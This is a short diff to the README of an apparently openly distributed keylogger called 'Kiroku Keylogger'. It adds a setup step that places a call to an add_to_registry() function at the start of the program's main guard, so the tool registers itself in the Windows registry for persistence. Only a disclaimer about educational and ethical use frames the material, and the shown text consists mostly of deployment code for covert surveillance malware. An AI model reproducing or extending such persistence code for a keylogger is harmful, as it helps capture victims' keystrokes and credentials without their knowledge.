@@ -94,6 +94,12 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
          except Exception as e:
              print(f"Failed to add executable to registry: {e}")
      ```
+  3. Call the function to the main guard (AT THE BEGINNING):
+     ```python
+     if __name__ == "__main__":
+         add_to_registry()
+     ```
+     
 ## Warning
 
 This tool is intended strictly for educational purposes and ethical hacking only. Unauthorized use of this tool for malicious activities or without explicit consent is illegal and strictly prohibited.
